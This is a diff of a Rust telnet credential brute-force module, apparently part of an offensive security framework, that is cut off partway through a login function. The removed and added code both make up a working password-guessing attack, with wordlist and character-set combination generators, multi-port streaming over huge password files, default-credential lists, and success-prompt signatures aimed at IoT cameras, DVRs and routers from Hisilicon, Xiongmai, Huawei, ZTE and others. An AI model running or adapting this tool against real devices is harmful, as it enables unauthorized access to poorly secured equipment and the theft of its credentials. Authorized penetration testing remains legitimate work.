-                let max_delay = base_delay.saturating_add(jitter_range);
-                let randomized_delay = rand::rng().random_range(min_delay..=max_delay);
-                sleep(Duration::from_millis(randomized_delay)).await;
-            }
-        }
-    })
-}
-
-fn spawn_progress_reporter(
-    stats: Arc<Statistics>,
-    stop_flag: Arc<AtomicBool>,
-) -> tokio::task::JoinHandle<()> {
-    tokio::spawn(async move {
-        let mut interval = tokio::time::interval(Duration::from_secs(PROGRESS_INTERVAL_SECS));
-        loop {
-            interval.tick().await;
-            if stop_flag.load(Ordering::Relaxed) {
-                break;
-            }
-            stats.print_progress();
-        }
-    })
-}
-
-fn spawn_producers(
-    config: &TelnetBruteforceConfig,
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                   use_streaming: bool,
-                   usernames: &[String],
-                   passwords: &[String],
-                   username_count: usize,
-                   password_count: usize,
-                   stop_flag: Arc<AtomicBool>,
-) {
-    if use_streaming {
-        spawn_streaming_producers(config, tx.clone(), username_count, password_count, stop_flag.clone());
-    } else {
-        spawn_memory_producers(config, tx.clone(), usernames, passwords, stop_flag.clone());
-    }
-    drop(tx);
-}
-
-// src/modules/creds/generic/telnet_bruteforce.rs - PART 3/4
-// Producer Functions and Combo Generation Logic
-
-fn spawn_streaming_producers(
-    config: &TelnetBruteforceConfig,
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                             username_count: usize,
-                             password_count: usize,
-                             stop_flag: Arc<AtomicBool>,
-) {
-    if password_count > 0 {
-        let password_path = match config.password_wordlist.clone() {
-            Some(path) => path,
-            None => {
-                eprintln!("[!] Password wordlist required but not configured");
-                return;
-            }
-        };
-        let username_path = config.username_wordlist.clone();
-        let full_combo = config.full_combo;
-        let tx_clone = tx.clone();
-        let stop_clone = stop_flag.clone();
-        tokio::spawn(async move {
-            if let Err(e) = enqueue_wordlist_combos_streaming(
-                tx_clone, &username_path, &password_path, full_combo,
-                stop_clone, username_count, password_count,
-            ).await {
-                eprintln!("[!] Wordlist producer error: {}", e);
-            }
-        });
-    }
-
-    if config.raw_bruteforce {
-        let charset: Vec<char> = config.raw_charset.chars().collect();
-        let min_len = config.raw_min_length;
-        let max_len = config.raw_max_length;
-        let username_path = config.username_wordlist.clone();
-        let full_combo = config.full_combo;
-        let tx_clone = tx.clone();
-        let stop_clone = stop_flag.clone();
-        tokio::spawn(async move {
-            if let Err(e) = generate_raw_combos_streaming(
-                tx_clone, &username_path, charset, min_len, max_len,
-                full_combo, stop_clone, username_count,
-            ).await {
-                eprintln!("[!] Raw producer error: {}", e);
-            }
-        });
-    }
-}
-
-fn spawn_memory_producers(
-    config: &TelnetBruteforceConfig,
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                          usernames: &[String],
-                          passwords: &[String],
-                          stop_flag: Arc<AtomicBool>,
-) {
-    let usernames_arc: Vec<Arc<str>> = usernames.iter().map(|s| Arc::from(s.as_str())).collect();
-    let passwords_arc: Vec<Arc<str>> = passwords.iter().map(|s| Arc::from(s.as_str())).collect();
-
-    if !passwords_arc.is_empty() {
-        let passwords_clone = passwords_arc.clone();
-        let usernames_clone = usernames_arc.clone();
-        let full_combo = config.full_combo;
-        let tx_clone = tx.clone();
-        let stop_clone = stop_flag.clone();
-        tokio::spawn(async move {
-            if let Err(e) = enqueue_wordlist_combos_fast(
-                tx_clone, &usernames_clone, &passwords_clone, full_combo, stop_clone,
-            ).await {
-                eprintln!("[!] Wordlist producer error: {}", e);
-            }
-        });
-    }
-
-    if config.raw_bruteforce {
-        let charset: Vec<char> = config.raw_charset.chars().collect();
-        let min_len = config.raw_min_length;
-        let max_len = config.raw_max_length;
-        let usernames_clone = usernames_arc.clone();
-        let full_combo = config.full_combo;
-        let tx_clone = tx.clone();
-        let stop_clone = stop_flag.clone();
-        tokio::spawn(async move {
-            if let Err(e) = generate_raw_combos(
-                tx_clone, &usernames_clone, charset, min_len, max_len, full_combo, stop_clone,
-            ).await {
-                eprintln!("[!] Raw producer error: {}", e);
-            }
-        });
-    }
-}
-
-// ============================================================
-// COMBO GENERATION FUNCTIONS
-// ============================================================
-
-#[inline]
-async fn enqueue_wordlist_combos_fast(
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                                      usernames: &[Arc<str>],
-                                      passwords: &[Arc<str>],
-                                      full_combo: bool,
-                                      stop_flag: Arc<AtomicBool>,
-) -> Result<()> {
-    if passwords.is_empty() {
-        return Ok(());
-    }
-
-    if full_combo {
-        for user in usernames {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-            for pass in passwords {
-                if stop_flag.load(Ordering::Relaxed) { break; }
-                tx.send((user.clone(), pass.clone())).await.ok();
-            }
-        }
-    } else if usernames.len() == 1 {
-        let user = &usernames[0];
-        for pass in passwords {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-            tx.send((user.clone(), pass.clone())).await.ok();
-        }
-    } else if passwords.len() == 1 {
-        let pass = &passwords[0];
-        for user in usernames {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-            tx.send((user.clone(), pass.clone())).await.ok();
-        }
-    } else {
-        let user = &usernames[0];
-        for pass in passwords {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-            tx.send((user.clone(), pass.clone())).await.ok();
-        }
-    }
-
-    Ok(())
-}
-
-async fn generate_raw_combos(
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                             usernames: &[Arc<str>],
-                             charset: Vec<char>,
-                             min_len: usize,
-                             max_len: usize,
-                             full_combo: bool,
-                             stop_flag: Arc<AtomicBool>,
-) -> Result<()> {
-    if charset.is_empty() || max_len == 0 {
-        return Ok(());
-    }
-
-    let base = charset.len();
-
-    for len in min_len..=max_len {
-        if stop_flag.load(Ordering::Relaxed) { break; }
-
-        let mut indices = vec![0usize; len];
-
-        loop {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-
-            let pwd: String = indices.iter().map(|&i| charset[i]).collect();
-            let pwd_arc: Arc<str> = Arc::from(pwd.as_str());
-
-            if full_combo || usernames.len() == 1 {
-                for user in usernames {
-                    if stop_flag.load(Ordering::Relaxed) { break; }
-                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
-                }
-            } else {
-                let user = &usernames[0];
-                tx.send((user.clone(), pwd_arc)).await.ok();
-            }
-
-            let mut carry = true;
-            for i in (0..len).rev() {
-                if carry {
-                    indices[i] += 1;
-                    if indices[i] < base {
-                        carry = false;
-                    } else {
-                        indices[i] = 0;
-                    }
-                }
-            }
-
-            if carry { break; }
-        }
-    }
-
-    Ok(())
-}
-
-async fn enqueue_wordlist_combos_streaming(
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                                           username_path: &str,
-                                           password_path: &str,
-                                           full_combo: bool,
-                                           stop_flag: Arc<AtomicBool>,
-                                           username_count: usize,
-                                           _password_count: usize,
-) -> Result<()> {
-    if full_combo {
-        // Open password file once and cache passwords to avoid reopening file for each username
-        let pass_file = File::open(password_path).await?;
-        let pass_reader = BufReader::new(pass_file);
-        let mut pass_lines = pass_reader.lines();
-        let mut passwords = Vec::new();
-
-        while let Some(pass_line) = pass_lines.next_line().await? {
-            let pass = pass_line.trim();
-            if !pass.is_empty() {
-                passwords.push(Arc::<str>::from(pass));
-            }
-        }
-
-        // Now iterate through usernames and send combinations
-        let user_file = File::open(username_path).await?;
-        let user_reader = BufReader::new(user_file);
-        let mut user_lines = user_reader.lines();
-
-        while let Some(user_line) = user_lines.next_line().await? {
-            let user = user_line.trim();
-            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
-                continue;
-            }
-            let user_arc: Arc<str> = Arc::from(user);
-
-            // Send combinations for this user with all passwords
-            for pass_arc in &passwords {
-                if stop_flag.load(Ordering::Relaxed) {
-                    return Ok(());
-                }
-                tx.send((user_arc.clone(), pass_arc.clone())).await.ok();
-            }
-        }
-    } else if username_count == 1 {
-        let user_file = File::open(username_path).await?;
-        let user_reader = BufReader::new(user_file);
-        let mut user_lines = user_reader.lines();
-        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
-        let user_arc: Arc<str> = Arc::from(user_line.trim());
-
-        let pass_file = File::open(password_path).await?;
-        let pass_reader = BufReader::new(pass_file);
-        let mut pass_lines = pass_reader.lines();
-
-        while let Some(pass_line) = pass_lines.next_line().await? {
-            let pass = pass_line.trim();
-            if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
-                continue;
-            }
-            let pass_arc: Arc<str> = Arc::from(pass);
-            tx.send((user_arc.clone(), pass_arc)).await.ok();
-        }
-    } else {
-        let pass_file = File::open(password_path).await?;
-        let pass_reader = BufReader::new(pass_file);
-        let mut pass_lines = pass_reader.lines();
-        let pass_line = pass_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
-        let pass_arc: Arc<str> = Arc::from(pass_line.trim());
-
-        let user_file = File::open(username_path).await?;
-        let user_reader = BufReader::new(user_file);
-        let mut user_lines = user_reader.lines();
-
-        while let Some(user_line) = user_lines.next_line().await? {
-            let user = user_line.trim();
-            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
-                continue;
-            }
-            let user_arc: Arc<str> = Arc::from(user);
-            tx.send((user_arc, pass_arc.clone())).await.ok();
-        }
-    }
-
-    Ok(())
-}
-
-async fn generate_raw_combos_streaming(
-    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
-                                       username_path: &str,
-                                       charset: Vec<char>,
-                                       min_len: usize,
-                                       max_len: usize,
-                                       full_combo: bool,
-                                       stop_flag: Arc<AtomicBool>,
-                                       username_count: usize,
-) -> Result<()> {
-    if charset.is_empty() || max_len == 0 {
-        return Ok(());
-    }
-
-    let base = charset.len();
-
-    if full_combo || username_count == 1 {
-        let user_file = File::open(username_path).await?;
-        let user_reader = BufReader::new(user_file);
-        let mut user_lines = user_reader.lines();
-        let mut usernames: Vec<Arc<str>> = Vec::new();
-
-        while let Some(user_line) = user_lines.next_line().await? {
-            let user = user_line.trim();
-            if !user.is_empty() {
-                usernames.push(Arc::from(user));
-            }
-        }
-
-        for len in min_len..=max_len {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-
-            let mut indices = vec![0usize; len];
-
-            loop {
-                if stop_flag.load(Ordering::Relaxed) { break; }
-
-                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
-                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());
-
-                for user in &usernames {
-                    if stop_flag.load(Ordering::Relaxed) { break; }
-                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
-                }
-
-                let mut carry = true;
-                for i in (0..len).rev() {
-                    if carry {
-                        indices[i] += 1;
-                        if indices[i] < base {
-                            carry = false;
-                        } else {
-                            indices[i] = 0;
-                        }
-                    }
-                }
-
-                if carry { break; }
-            }
-        }
-    } else {
-        let user_file = File::open(username_path).await?;
-        let user_reader = BufReader::new(user_file);
-        let mut user_lines = user_reader.lines();
-        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
-        let user_arc: Arc<str> = Arc::from(user_line.trim());
-
-        for len in min_len..=max_len {
-            if stop_flag.load(Ordering::Relaxed) { break; }
-
-            let mut indices = vec![0usize; len];
-
-            loop {
-                if stop_flag.load(Ordering::Relaxed) { break; }
-
-                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
-                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());
-
-                tx.send((user_arc.clone(), pwd_arc)).await.ok();
-
-                let mut carry = true;
-                for i in (0..len).rev() {
-                    if carry {
-                        indices[i] += 1;
-                        if indices[i] < base {
-                            carry = false;
-                        } else {
-                            indices[i] = 0;
-                        }
-                    }
-                }
-
-                if carry { break; }
-            }
-        }
-    }
-
-    Ok(())
-}
-
-// ============================================================
-// CONFIGURATION FUNCTIONS
-// ============================================================
-
-async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig> {
-    println!();
-    println!("{}", "[Interactive Configuration]".bold().green());
-    println!();
-
-    let port = prompt_port("Port", 23)?;
-    let threads = prompt_threads(8)?;
-    let delay_ms = prompt_delay(100)?;
-    let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3)?;
-    let banner_read_timeout = prompt_timeout("Banner read timeout (seconds, default 2): ", 2)?;
-    let login_prompt_timeout = prompt_timeout("Login prompt timeout (seconds, default 3): ", 3)?;
-    let password_prompt_timeout = prompt_timeout("Password prompt timeout (seconds, default 3): ", 3)?;
-    let auth_response_timeout = prompt_timeout("Auth response timeout (seconds, default 5): ", 5)?;
-    let command_timeout = prompt_timeout("Command timeout (seconds, default 3): ", 3)?;
-    let write_timeout = 500; // Fixed write timeout in milliseconds
-
-    let username_wordlist = prompt_existing_file("Username wordlist file: ")?;
-    let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false)?;
-
-    let password_wordlist = if raw_bruteforce {
-        prompt_optional_wordlist("Password wordlist (leave blank to skip): ")?
-    } else {
-        Some(prompt_existing_file("Password wordlist file: ")?)
-    };
-
-    let (raw_charset, raw_min_length, raw_max_length) = if raw_bruteforce {
-        let charset = prompt_charset("Character set (default: lowercase): ", "abcdefghijklmnopqrstuvwxyz")?;
-        let min_len = prompt_min_length(1, 1, 8)?;
-        let max_len = prompt_max_length(4, min_len, 8)?;
-        (charset, min_len, max_len)
-    } else {
-        (String::new(), 0, 0)
-    };
-
-    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false)?;
-    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false)?;
-
-    let output_file = prompt_required("Output file: ")?;
-    let append_mode = if tokio::fs::metadata(&output_file).await.is_ok() {
-        prompt_yes_no(&format!("File exists. Append? (y/n): "), true)?
-    } else {
-        false
-    };
-
-    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false)?;
-    let pre_validate = prompt_yes_no("Pre-validate target? (y/n): ", true)?;
-    let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true)?;
-    let max_retries = if retry_on_error { prompt_retries(2)? } else { 0 };
-
-    let use_custom_prompts = prompt_yes_no("Use custom prompts? (y/n): ", false)?;
-
-    let (login_prompts, password_prompts, success_indicators, failure_indicators) =
-    if use_custom_prompts {
-        (
-            prompt_list("Login prompts (comma-separated): ")?,
-         prompt_list("Password prompts (comma-separated): ")?,
-         prompt_list("Success indicators (comma-separated): ")?,
-         prompt_list("Failure indicators (comma-separated): ")?,
+    let stop_on_success =
+        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
+
+    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
+    let save_path = if save_results {
+        Some(
+            cfg_prompt_output_file("output_file", "Output file", "telnet_brute_results.txt")
+                .await?,
         )
     } else {
-        get_default_prompts()
+        None
     };
 
-    Ok(TelnetBruteforceConfig {
-        target: target.to_string(),
-       port, username_wordlist, password_wordlist, threads, delay_ms,
-       connection_timeout, banner_read_timeout, login_prompt_timeout,
-       password_prompt_timeout, auth_response_timeout, command_timeout, write_timeout,
-       stop_on_success, verbose, full_combo,
-       raw_bruteforce, raw_charset, raw_min_length, raw_max_length,
-       output_file, append_mode, pre_validate, retry_on_error, max_retries,
-       login_prompts, password_prompts, success_indicators, failure_indicators,
-       login_prompts_lower: Vec::new(),
-       password_prompts_lower: Vec::new(),
-       success_indicators_lower: Vec::new(),
-       failure_indicators_lower: Vec::new(),
-    })
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
+    let combo_mode = cfg_prompt_yes_no(
+        "combo_mode",
+        "Combination mode? (try every pass with every user)",
+        false,
+    )
+    .await?;
+
+    // Resolve target once (not in hot path)
+    let resolved_target = normalize_target(target).unwrap_or_else(|_| target.to_string());
+
+    // Load usernames (always fits in memory — username lists are small)
+    let mut usernames = Vec::new();
+    if let Some(ref file) = usernames_file {
+        usernames = load_lines(file)?;
+        if !usernames.is_empty() {
+            crate::mprintln!(
+                "{}",
+                format!("[*] Loaded {} usernames", usernames.len()).green()
+            );
+        }
+    }
+
+    // Add defaults using HashSet for O(1) dedup
+    if use_defaults {
+        let mut user_set: HashSet<String> = usernames.iter().cloned().collect();
+        for &(u, _) in DEFAULT_CREDENTIALS {
+            if user_set.insert(u.to_string()) {
+                usernames.push(u.to_string());
+            }
+        }
+    }
+    if usernames.is_empty() {
+        return Err(anyhow!("No usernames available"));
+    }
+
+    // Determine if password file needs streaming
+    let pass_file_size = passwords_file
+        .as_ref()
+        .and_then(|f| std::fs::metadata(f).ok())
+        .map(|m| m.len())
+        .unwrap_or(0);
+    let needs_streaming = pass_file_size > MAX_MEMORY_WORDLIST_BYTES;
+
+    if needs_streaming {
+        crate::mprintln!(
+            "{}",
+            format!(
+                "[*] Password file is {:.1} GB — using streaming mode ({}K lines/chunk)",
+                pass_file_size as f64 / (1024.0 * 1024.0 * 1024.0),
+                STREAM_CHUNK_SIZE / 1000
+            )
+            .yellow()
+        );
+    }
+
+    // Load or prepare passwords
+    let mut passwords = Vec::new();
+    if !needs_streaming {
+        if let Some(ref file) = passwords_file {
+            passwords = load_lines(file)?;
+            if !passwords.is_empty() {
+                crate::mprintln!(
+                    "{}",
+                    format!("[*] Loaded {} passwords", passwords.len()).green()
+                );
+            }
+        }
+    }
+
+    if use_defaults {
+        let mut pass_set: HashSet<String> = passwords.iter().cloned().collect();
+        for &(_, p) in DEFAULT_CREDENTIALS {
+            if pass_set.insert(p.to_string()) {
+                passwords.push(p.to_string());
+            }
+        }
+    }
+
+    if !needs_streaming && passwords.is_empty() {
+        return Err(anyhow!("No passwords available"));
+    }
+
+    let cfg = Arc::new(TelnetConfig::new(connection_timeout, READ_TIMEOUT_SECS));
+
+    // Build the try_login closure — target is pre-resolved, not computed per attempt
+    let make_try_login = |cfg: Arc<TelnetConfig>, resolved: String| {
+        move |_t: String, p: u16, user: String, pass: String| {
+            let cfg = cfg.clone();
+            let addr = format!("{}:{}", resolved, p);
+            async move {
+                match try_telnet_login(&addr, &user, &pass, &cfg).await {
+                    Ok(true) => LoginResult::Success,
+                    Ok(false) => LoginResult::AuthFailed,
+                    Err(e) => {
+                        let msg = e.to_string();
+                        let retryable = is_retryable_error(&msg);
+                        LoginResult::Error {
+                            message: msg,
+                            retryable,
+                        }
+                    }
+                }
+            }
+        }
+    };
+
+    // Run bruteforce across all ports
+    let mut all_found: Vec<(String, String, String)> = Vec::new();
+    let mut stop_early = false;
+
+    for &port in &ports {
+        if ports.len() > 1 {
+            crate::mprintln!(
+                "\n{}",
+                format!("[*] Attacking {}:{}", resolved_target, port).cyan()
+            );
+        } else {
+            crate::mprintln!(
+                "\n{}",
+                format!("[*] Starting brute-force on {}:{}", resolved_target, port).cyan()
+            );
+        }
+
+        let bf_config = BruteforceConfig {
+            target: resolved_target.clone(),
+            port,
+            concurrency,
+            stop_on_success,
+            verbose,
+            delay_ms: 0,
+            max_retries,
+            service_name: "telnet",
+            source_module: "creds/generic/telnet_bruteforce",
+        };
+
+        if needs_streaming {
+            // Streaming mode: read password file in chunks to avoid OOM
+            let pass_path = passwords_file.as_ref()
+                .ok_or_else(|| anyhow::anyhow!("Password file path is required for streaming mode"))?;
+            let file = std::fs::File::open(pass_path)?;
+            let reader = std::io::BufReader::new(file);
+            let mut chunk = Vec::with_capacity(STREAM_CHUNK_SIZE);
+            let mut chunk_num = 0u64;
+
+            // First: run default passwords if enabled (already in `passwords` vec)
+            if !passwords.is_empty() {
+                let combos = generate_combos(&usernames, &passwords, combo_mode);
+                let result = run_bruteforce(
+                    &bf_config,
+                    combos,
+                    make_try_login(cfg.clone(), resolved_target.clone()),
+                )
+                .await?;
+                result.print_found();
+                if let Some(ref path) = save_path {
+                    // Append mode for streaming — don't truncate between chunks
+                    result.save_to_file(path)?;
+                }
+                for f in &result.found {
+                    all_found.push(f.clone());
+                }
+                if stop_on_success && !result.found.is_empty() {
+                    break;
+                }
+            }
+
+            // Then: stream password file in chunks
+            for line in reader.lines() {
+                let line = match line {
+                    Ok(l) => l.trim().to_string(),
+                    Err(_) => continue,
+                };
+                if line.is_empty() {
+                    continue;
+                }
+                chunk.push(line);
+
+                if chunk.len() >= STREAM_CHUNK_SIZE {
+                    chunk_num += 1;
+                    crate::mprintln!(
+                        "{}",
+                        format!(
+                            "[*] Streaming chunk {} ({} passwords)",
+                            chunk_num,
+                            chunk.len()
+                        )
+                        .cyan()
+                    );
+                    let combos = generate_combos(&usernames, &chunk, combo_mode);
+                    let result = run_bruteforce(
+                        &bf_config,
+                        combos,
+                        make_try_login(cfg.clone(), resolved_target.clone()),
+                    )
+                    .await?;
+                    result.print_found();
+                    if let Some(ref path) = save_path {
+                        // Append mode for streaming — don't truncate between chunks
+                        result.save_to_file(path)?;
+                    }
+                    for f in &result.found {
+                        all_found.push(f.clone());
+                    }
+                    if stop_on_success && !result.found.is_empty() {
+                        stop_early = true;
+                        break;
+                    }
+                    chunk.clear();
+                }
+            }
+
+            // Final partial chunk
+            if !chunk.is_empty() {
+                chunk_num += 1;
+                crate::mprintln!(
+                    "{}",
+                    format!(
+                        "[*] Streaming chunk {} ({} passwords)",
+                        chunk_num,
+                        chunk.len()
+                    )
+                    .cyan()
+                );
+                let combos = generate_combos(&usernames, &chunk, combo_mode);
+                let result = run_bruteforce(
+                    &bf_config,
+                    combos,
+                    make_try_login(cfg.clone(), resolved_target.clone()),
+                )
+                .await?;
+                result.print_found();
+                if let Some(ref path) = save_path {
+                    // Append mode for streaming — don't truncate between chunks
+                    result.save_to_file(path)?;
+                }
+                for f in &result.found {
+                    all_found.push(f.clone());
+                }
+            }
+        } else {
+            // Normal mode: everything fits in memory
+            let combos = generate_combos(&usernames, &passwords, combo_mode);
+            let result = run_bruteforce(
+                &bf_config,
+                combos,
+                make_try_login(cfg.clone(), resolved_target.clone()),
+            )
+            .await?;
+            result.print_found();
+            if let Some(ref path) = save_path {
+                result.save_to_file(path)?;
+            }
+            for f in &result.found {
+                all_found.push(f.clone());
+            }
+
+            // Error reporting
+            if !result.errors.is_empty() {
+                crate::mprintln!(
+                    "{}",
+                    format!(
+                        "[?] {} unknown/errored Telnet responses on port {}.",
+                        result.errors.len(),
+                        port
+                    )
+                    .yellow()
+                );
+                if cfg_prompt_yes_no(
+                    "save_unknown_responses",
+                    "Save unknown responses to file?",
+                    true,
+                )
+                .await?
+                {
+                    let fname = cfg_prompt_output_file(
+                        "unknown_responses_file",
+                        "Save as",
+                        "telnet_unknown_responses.txt",
+                    )
+                    .await?;
+                    let filename = get_filename_in_current_dir(&fname);
+                    use std::os::unix::fs::OpenOptionsExt;
+                    let mut opts = std::fs::OpenOptions::new();
+                    opts.write(true).create(true).truncate(true).mode(0o600);
+                    if let Ok(mut file) = opts.open(&filename) {
+                        writeln!(file, "# Telnet Bruteforce Errors (host,user,pass,error)")?;
+                        for (host, user, pass, msg) in &result.errors {
+                            writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
+                        }
+                        file.flush()?;
+                        crate::mprintln!(
+                            "{}",
+                            format!("[+] Saved to '{}'", filename.display()).green()
+                        );
+                    }
+                }
+            }
+        }
+
+        if stop_early || (stop_on_success && !all_found.is_empty()) {
+            break;
+        }
+    }
+
+    // Summary across all ports
+    if ports.len() > 1 && !all_found.is_empty() {
+        crate::mprintln!(
+            "\n{}",
+            format!(
+                "[+] Found {} valid credential(s) across {} port(s):",
+                all_found.len(),
+                ports.len()
+            )
+            .green()
+            .bold()
+        );
+        for (host, user, pass) in &all_found {
+            crate::mprintln!("  {} {}  {}:{}", "\u{2713}".green(), host, user, pass);
+        }
+    }
+
+    Ok(())
 }
 
-fn get_default_prompts() -> (Vec<String>, Vec<String>, Vec<String>, Vec<String>) {
-    (
-        // Login prompts - English + Multi-language support
-        vec![
-            // English
-            "login:".to_string(), "username:".to_string(), "user:".to_string(),
-     "user name:".to_string(), "account:".to_string(), "userid:".to_string(),
-     // Spanish
-     "usuario:".to_string(), "nombre de usuario:".to_string(), "login:".to_string(),
-     // French
-     "identifiant:".to_string(), "nom d'utilisateur:".to_string(), "connexion:".to_string(),
-     // Portuguese
-     "usuário:".to_string(), "login:".to_string(), "usuário:".to_string(),
-     // German
-     "benutzername:".to_string(), "anmeldename:".to_string(), "login:".to_string(),
-     // Italian
-     "nome utente:".to_string(), "login:".to_string(), "utente:".to_string(),
-     // Russian (already had some)
-     "логин:".to_string(), "пользователь:".to_string(),
-     // Chinese (simplified)
-     "用户名:".to_string(), "登录:".to_string(), "用户:".to_string(),
-     // Japanese
-     "ユーザー名:".to_string(), "ログイン:".to_string(),
-     // Arabic
-     "اسم المستخدم:".to_string(), "تسجيل الدخول:".to_string(),
-        ],
+/// Parse comma-separated port list (e.g. "23,2323,8023").
+fn parse_ports(input: &str) -> Vec<u16> {
+    input
+        .split(',')
+        .filter_map(|s| s.trim().parse::<u16>().ok())
+        .filter(|&p| p > 0)
+        .collect()
+}
 
-     // Password prompts - English + Multi-language support
-     vec![
-         // English
-         "password:".to_string(), "passwd:".to_string(), "pass:".to_string(),
-     "enter password".to_string(), "password for".to_string(),
-     // Spanish
-     "contraseña:".to_string(), "clave:".to_string(),
-     // French
-     "mot de passe:".to_string(),
-     // Portuguese
-     "senha:".to_string(),
-     // German
-     "passwort:".to_string(),
-     // Italian
-     "password:".to_string(),
-     // Russian
-     "пароль:".to_string(),
-     // Chinese
-     "密码:".to_string(),
-     // Japanese
-     "パスワード:".to_string(),
-     // Arabic
-     "كلمة المرور:".to_string(),
-     ],
+// ============================================================
+// Core login function
+// ============================================================
 
-     // Success indicators - English + Multi-language support
-     vec![
-         // Basic shell prompts
-         "$", "#", ">", "~", "%", " # ", " ~# ", " /# ", " ~ # ", " / # ",
-     "~ ", "% ", "~$",
+/// Attempt a single telnet login.
+/// - `Ok(true)`  — authentication succeeded (verified with shell probe)
+/// - `Ok(false)` — authentication explicitly failed
+/// - `Err(_)`    — connection/protocol error
+async fn try_telnet_login(addr: &str, user: &str, pass: &str, cfg: &TelnetConfig) -> Result<bool> {
+    // 1. TCP connect
+    let mut stream = timeout(cfg.connect_timeout, TcpStream::connect(addr))
+        .await
+        .map_err(|_| anyhow!("{}: connection timeout", addr))?
+        .map_err(|e| anyhow!("{}: {}", addr, e))?;
 
-     // Common login success / welcome messages (English + multilingual)
-     "last login", "welcome", "welcome to", "logged in",
-     "login successful", "authentication successful", "successfully authenticated",
-     "motd", "message of the day", "have a lot of fun",
-     "you have mail", "you have new mail",
-     "press any key", "continue", "enter command", "available commands", "type help",
+    // Disable Nagle — telnet sends small packets, latency matters more than throughput
+    let _ = stream.set_nodelay(true);
 
-     // User/host prompts
-     "user@", "root@", "admin@", "ubuntu", "debian", "centos", "red hat", "fedora",
-     "freebsd", "openbsd", "[root@", "[admin@", "bash-", "sh-",
-     "root:~#", "root:/#", "root@(none):/#", "root@(none):~#",
+    let mut buf = String::with_capacity(RECENT_BUF_CAP);
+    let mut raw = [0u8; 4096];
 
-     // Network device prompts
-     "router>", "router#", "switch>", "switch#",
-     "cisco", "ios>", "ios#",
+    // 2. Banner phase: short initial read (2s) to get prompts quickly
+    let banner_time = cfg.read_timeout.min(Duration::from_secs(2));
+    drain_and_negotiate(&mut stream, &mut buf, &mut raw, banner_time).await;
 
-     // Multilingual welcomes (existing + expanded)
-     "bienvenido", "conectado", "bienvenue", "connecté", "bem-vindo", "willkommen", "angemeldet",
-     "benvenuto", "connesso", "добро пожаловать", "подключен",
-     "欢迎", "已连接", "ようこそ", "接続されました",
+    // If we got IAC but no visible text yet, server may send prompt after negotiation
+    if buf.trim().is_empty() {
+        drain_and_negotiate(&mut stream, &mut buf, &mut raw, Duration::from_millis(1500)).await;
+    }
 
-     // === Chinese IoT / IP camera / router specific (niche, exotic, from real device dumps) ===
-     "~ #", "/ #", "~#", "/#",
-     "built-in shell (ash)",
-     "enter 'help' for a list of built-in commands.",
-     "/bin/sh: can't access tty; job control turned off",
-     "busybox v",
-     "busybox built-in shell",
-     "welcome to faraday",
-     "welcome to faraday busybox",
-     "faraday busybox",
-     "[root@gm]#", "root@gm",
-     "[root@dvrdvs /]#",
-     "dvrdvs#",
-     "hi3518", "hi3516", "hi3536", "hisilicon",
-     "xm#", "xiongmai#", "xmeye#",
-     "gm8136", "gm8135", "grainmedia",
-     "<huawei>", "[huawei]", "huawei>", "huawei#",
-     "welcome visiting huawei", "huawei home gateway", "huawei terminal",
-     "zte>", "zxa", "zxan#", "zxa10#",
-     "fiberhome>", "fiberhome#",
-     "tp-link>", "tp-link router",
-     "tenda>", "tenda technology",
-     "xiaoqiang#", "miwifi#", "xiaomi router",
-     "欢迎使用", "欢迎登录", "欢迎访问", "欢迎光临", "欢迎来到",
-     "欢迎使用本系统", "欢迎使用该终端", "欢迎使用该设备",
-     "欢迎您", "欢迎您登录", "您已成功登录",
-     "登录成功", "成功登录", "认证成功", "成功认证", "认证通过",
-     "已登录", "连接成功", "已连接", "会话已建立",
-     "系统就绪", "终端就绪", "终端准备就绪",
-     "v380#", "v380 pro#", "yyp2p#",
-     "jovision#", "tiandy#", "uniview#",
-     "escam#", "besder#", "wanscam#", "vstarcam#",
-     "annke#", "sv3c#", "foscam#",
-     "comfast#", "wavlink#", "kuwfi#",
-     "ipcamera login",
-     "ont#", "gpon#", "home gateway",
-     "copyright huawei technologies", "copyright (c) huawei",
-     "vrp", "versatile routing platform",
-     "autenticación exitosa", "login exitoso",
-     "authentification réussie", "autenticação bem-sucedida",
-     "authentifizierung erfolgreich", "autenticazione riuscita",
-     "аутентификация успешна", "认证成功", "認証成功",
-     ].iter().map(|s| s.to_string()).collect(),
+    // Handle "press any key / press Enter to continue" screens.
+    // Use multi-word phrases to avoid false matches ("express", "compressed", "password").
+    {
+        let lower = buf.to_lowercase();
+        if lower.contains("press any key")
+            || lower.contains("press enter")
+            || lower.contains("hit enter")
